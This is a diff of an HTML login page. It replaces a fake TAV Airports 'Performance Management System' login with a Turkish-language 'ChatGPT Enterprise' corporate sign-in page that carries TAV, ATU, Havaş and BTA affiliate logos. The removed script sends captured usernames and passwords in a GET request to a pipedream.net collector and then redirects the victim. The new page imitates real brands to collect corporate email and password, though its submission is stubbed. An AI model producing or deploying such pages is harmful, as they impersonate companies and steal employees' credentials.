@@ -1,192 +1,188 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="tr">
 <head>
   <meta charset="UTF-8" />
-  <title>Performance Monitoring System</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="theme-color" content="#0FA47E" />
+  <title>ChatGPT Enterprise — Kurumsal Giriş</title>
   <style>
-    * {
-      box-sizing: border-box;
+    :root{
+      /* Yeni palet: koyu tema + ChatGPT yeşili */
+      --bg:#0b0f0e;
+      --bg-soft:#0d1412;
+      --panel:#0f1514;
+      --text:#e8f1ee;
+      --muted:#a3b2ad;
+      --accent:#10A37F;   /* ChatGPT yeşil */
+      --accent-2:#00C389; /* vurgularda gradient için */
+      --danger:#ff6b6b;
+      --ring: rgba(16,163,127,.35);
     }
 
-    body {
-      margin: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(135deg, #1e3c72, #2a5298);
-      height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+    *{ box-sizing:border-box }
+    html,body{ height:100% }
+    body{
+      margin:0; color:var(--text);
+      font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji";
+      background:
+        radial-gradient(1200px 800px at 20% -10%, rgba(16,163,127,.10), transparent 60%),
+        radial-gradient(1000px 700px at 120% 120%, rgba(0,195,137,.08), transparent 55%),
+        linear-gradient(180deg, #0a0f0e 0%, #060808 100%);
+      display:grid; place-items:center;
+      padding:24px;
+      color-scheme: dark;
     }
 
-    .container {
-      width: 100%;
-      max-width: 400px;
-      padding: 30px;
-      background-color: #ffffff;
-      border-radius: 15px;
-      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.3);
-      text-align: center;
-      position: relative;
+    /* Arka planda yumuşak çizgili grid */
+    .grid-overlay{
+      position:fixed; inset:0; pointer-events:none; opacity:.06;
+      background-image: linear-gradient(transparent 23px, #fff 24px), linear-gradient(90deg, transparent 23px, #fff 24px);
+      background-size: 24px 24px;
+      mix-blend-mode: soft-light;
     }
 
-    .login-form h2 {
-      color: #1e3c72;
-      margin-bottom: 25px;
+    .card{
+      width:100%; max-width:460px; position:relative; overflow:hidden;
+      background: linear-gradient(180deg, rgba(255,255,255,.04), rgba(255,255,255,.02)) , var(--panel);
+      border:1px solid rgba(255,255,255,.06);
+      border-radius:20px; padding:28px 26px 26px;
+      box-shadow: 0 24px 70px rgba(0,0,0,.55), inset 0 1px 0 rgba(255,255,255,.05);
+      backdrop-filter: blur(6px);
+      isolation:isolate;
     }
 
-    input[type="text"],
-    input[type="password"] {
-      width: 100%;
-      padding: 15px;
-      margin-bottom: 20px;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      background-color: #f9f9f9;
-      font-size: 15px;
-      transition: border 0.3s;
+    .card::after{ /* glow ring */
+      content:""; position:absolute; inset:-1px; border-radius:inherit; pointer-events:none;
+      box-shadow: 0 0 0 1px rgba(255,255,255,.04), 0 0 50px 8px var(--ring);
+      opacity:.22;
     }
 
-    input[type="text"]:focus,
-    input[type="password"]:focus {
-      border-color: #2a5298;
-      outline: none;
-      background-color: #fff;
+    .brand{ display:flex; align-items:center; gap:12px; margin:4px 0 8px }
+    .brand .logo{ width:38px; height:38px; filter:none !important }
+    .brand h1{ font-size:18px; font-weight:700; margin:0 }
+    .subtitle{ margin:0 0 18px 50px; color:var(--muted); font-size:12.5px }
+
+    .section-title{ font-size:14px; font-weight:600; color:#f1f6f4; margin:14px 0 10px }
+
+    .input{ width:100%; padding:13.5px 14px; border-radius:12px; outline:none;
+      background:#0a0f0e; border:1px solid rgba(255,255,255,.08); color:var(--text);
+      transition: border .15s ease, box-shadow .15s ease, background .2s ease; font-size:14.5px }
+    .input::placeholder{ color:#6c7672 }
+    .input:focus{ border-color:var(--accent); box-shadow:0 0 0 3px rgba(16,163,127,.18); background:#0b1110 }
+
+    .row{ display:flex; gap:10px }
+    label{ display:block; font-size:12.5px; color:var(--muted); margin:0 0 6px 2px }
+
+    .btn{ width:100%; padding:12.5px 14px; border:0; border-radius:12px; cursor:pointer;
+      font-weight:700; font-size:14.5px; letter-spacing:.2px; transition: transform .12s, box-shadow .12s, filter .12s }
+
+    .btn-primary{ color:#06120e; background:linear-gradient(90deg, var(--accent), var(--accent-2)); box-shadow:0 10px 22px rgba(16,163,127,.28) }
+    .btn-primary:hover{ transform:translateY(-1px) }
+
+    .btn-ghost{ background:transparent; color:var(--text); border:1px solid rgba(255,255,255,.10) }
+    .btn-ghost:hover{ filter:brightness(1.1) }
+
+    .sso{ display:grid; grid-template-columns: 1fr; gap:10px }
+    .sso .btn{ display:flex; align-items:center; justify-content:center; gap:10px }
+
+    .divider{ display:flex; align-items:center; gap:10px; margin:14px 0 }
+    .divider::before,.divider::after{ content:""; flex:1; height:1px; background:rgba(255,255,255,.08) }
+    .divider span{ font-size:12px; color:var(--muted) }
+
+    #error{ min-height:18px; font-size:12.5px; color:var(--danger); margin:8px 2px 0 }
+
+    .footer{ margin-top:14px; text-align:center; color:var(--muted); font-size:12px }
+
+    @media (prefers-reduced-motion:no-preference){
+      .logo-spin{ animation: spin 14s linear infinite }
+      @keyframes spin{ from{ transform:rotate(0deg)} to{ transform:rotate(360deg)} }
     }
-
-    .login-button {
-      width: 100%;
-      padding: 14px;
-      background: linear-gradient(90deg, #4facfe, #00f2fe);
-      border: none;
-      border-radius: 8px;
-      color: white;
-      font-weight: bold;
-      font-size: 16px;
-      cursor: pointer;
-      transition: background 0.3s ease, transform 0.2s;
+      /* alt iştirak logo barı */
+    .affiliates-bar{
+      position:fixed; left:50%; bottom:20px; transform:translateX(-50%);
+      display:flex; flex-wrap:wrap; gap:14px; align-items:center; justify-content:center;
+      padding:10px 16px; z-index:50;
+      background: rgba(255,255,255,.06);
+      border:1px solid rgba(255,255,255,.10);
+      border-radius:16px; box-shadow: 0 10px 28px rgba(0,0,0,.35);
+      backdrop-filter: blur(6px);
     }
-
-    .login-button:hover {
-      transform: translateY(-2px);
-      background: linear-gradient(90deg, #00f2fe, #4facfe);
+    .affiliates-bar img{
+      height:42px; max-width:160px; object-fit:contain; filter:none; opacity:1;
+      background:transparent; padding:6px; border-radius:12px; transition: transform .2s ease;
     }
+    .affiliates-bar img:hover{ transform: translateY(-2px) }
 
-    .footer-text {
-      font-size: 12px;
-      color: #666;
-      margin-top: 20px;
-    }
-
-    #error-message {
-      color: red;
-      margin-bottom: 10px;
-      font-size: 13px;
-    }
-
-    .logo-bar {
-      position: fixed;
-      bottom: 20px;
-      left: 50%;
-      transform: translateX(-50%);
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      align-items: center;
-      gap: 20px;
-      padding: 14px 24px;
-      background-color: rgba(255, 255, 255, 0.9);
-      border-radius: 16px;
-      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);
-      z-index: 10;
-    }
-
-    .logo-bar img {
-      height: 60px;
-      max-width: 300px;
-      object-fit: contain;
-      background-color: white;
-      padding: 10px;
-      border-radius: 14px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-      transition: transform 0.3s ease;
-    }
-
-    .logo-bar img:hover {
-      transform: scale(1.08);
-    }
-
-    @media screen and (max-width: 500px) {
-      .container {
-        margin: 0 20px;
-        padding: 25px;
-      }
-
-      .logo-bar {
-        gap: 12px;
-        padding: 10px 16px;
-      }
-
-      .logo-bar img {
-        height: 45px;
-        max-width: 80px;
-        padding: 6px;
-      }
+    @media (max-width:520px){
+      .affiliates-bar{ gap:10px; padding:8px 12px }
+      .affiliates-bar img{ height:34px; max-width:110px; padding:4px }
     }
   </style>
-
   <script>
-    function validateForm() {
-      var username = document.forms["loginForm"]["username"].value;
-      var password = document.forms["loginForm"]["password"].value;
-      var errorMessage = document.getElementById('error-message');
+    
 
-      errorMessage.textContent = '';
+    async function onSubmit(e){
+      e.preventDefault();
+      const form = e.target;
+      const email = form.email.value.trim();
+      const password = form.password.value;
+      const err = document.getElementById('error');
+      err.textContent = '';
 
-      if (password.length < 8) {
-        errorMessage.textContent = "Password must be at least 8 characters long.";
-        return false;
+      if(!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email)){
+        err.textContent = 'Geçerli bir e‑posta girin.'; return;
       }
+      if(password.length < 8){ err.textContent = 'Şifre en az 8 karakter olmalı.'; return; }
 
-      var params = new URLSearchParams();
-      params.append('username', username);
-      params.append('password', password);
-
-      fetch('https://eosdcxafrlhu2y.m.pipedream.net/?' + params.toString(), {
-        method: 'GET',
-      })
-      .then(response => response.text())
-      .then(data => {
-        console.log('Success:', data);
-        window.location.href = "https://tavaero.github.io/TAV-PMS/pms.html";
-      })
-      .catch((error) => {
-        console.error('Error:', error);
-      });
-
-      return false;
+      try{
+        // TODO: Kurum içi endpoint
+        // const res = await fetch('/auth/login', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ email, password })});
+        // if(!res.ok) throw new Error('Giriş başarısız');
+        await new Promise(r=>setTimeout(r, 500));
+        // Demo: başarılı sayılıyor
+        location.href = '#';
+      }catch(e){ err.textContent = 'Giriş yapılamadı. Lütfen bilgileri kontrol edin.' }
     }
   </script>
 </head>
-
 <body>
-  <div class="container login-form">
-    <h2>Performance Management System</h2>
-    <form name="loginForm" onsubmit="return validateForm()">
-      <input name="username" placeholder="Domain Account" required type="text" />
-      <input name="password" placeholder="Password" required type="password" />
-      <div id="error-message">&nbsp;</div>
-      <button class="login-button" type="submit">Login</button>
-      <div class="footer-text">
-        This software is the property of TAV Airports Holding.
-      </div>
-    </form>
-  </div>
+  <div class="grid-overlay" aria-hidden="true"></div>
 
-  <div class="logo-bar">
-    <img src="https://tavhavalimanlari.com.tr/images/TAV-Airport-International-logo.svg" alt="TAV Logo"/>
+  <main class="card" role="main" aria-label="ChatGPT Enterprise giriş kartı">
+    <header class="brand" aria-label="Marka">
+      <!-- ChatGPT swirl benzeri SVG (monokrom) -->
+      <img class="logo logo-spin" src="https://upload.wikimedia.org/wikipedia/commons/0/04/ChatGPT_logo.svg" alt="ChatGPT Logo" width="38" height="38" decoding="async" />
+      <h1>ChatGPT Enterprise</h1>
+    </header>
+    <p class="subtitle">Kurumsal hesabınızla oturum açın</p>
+
+    
+
+    
+
+    <section aria-label="E-posta ile giriş">
+      <form onsubmit="onSubmit(event)">
+        <label for="email">Kurumsal e‑posta</label>
+        <input class="input" id="email" name="email" type="email" placeholder="ad.soyad@firma.com" autocomplete="username" required />
+
+        <div style="height:10px"></div>
+        <label for="password">Şifre</label>
+        <input class="input" id="password" name="password" type="password" placeholder="••••••••" autocomplete="current-password" required />
+
+        <div id="error" role="alert" aria-live="polite"></div>
+        <div style="height:12px"></div>
+        <button class="btn btn-primary" type="submit">Devam et</button>
+      </form>
+    </section>
+
+    <p class="footer">Girişte sorun mu yaşıyorsunuz? <a href="#" style="color:var(--accent); text-decoration:none">BT ile iletişime geçin</a>.</p>
+  </main>
+  
+  <!-- İştirak logoları (TAV, ATU, Havaş, BTA) -->
+  <div class="affiliates-bar" aria-label="İştirakler">
+    <img src="https://tavhavalimanlari.com.tr/images/TAV-Airport-International-logo.svg" alt="TAV Airports"/>
     <img src="https://atu.com.tr/wp-content/uploads/2023/08/ATU-Logo-C%CC%A7erc%CC%A7eveli_page-0001-768x768.jpg" alt="ATU"/>
-    <img src="https://lh3.googleusercontent.com/proxy/yz1SclzsHmWxi7cYNsYWeHPpOXufu8izj6XaxLj93kxxY2E9tonFUExXqlzVcmVsCaXqqEJ9gYmS5H8bB1m9NgEGoFN11ali5bvqoiBzMV11cYLI" alt="HAVAS"/>
+    <img src="https://lh3.googleusercontent.com/proxy/yz1SclzsHmWxi7cYNsYWeHPpOXufu8izj6XaxLj93kxxY2E9tonFUExXqlzVcmVsCaXqqEJ9gYmS5H8bB1m9NgEGoFN11ali5bvqoiBzMV11cYLI" alt="Havaş"/>
     <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTug1qy1PlT2nX7mt03gWpE1_jdcFH4pLu06w&s" alt="BTA"/>
   </div>
 </body>
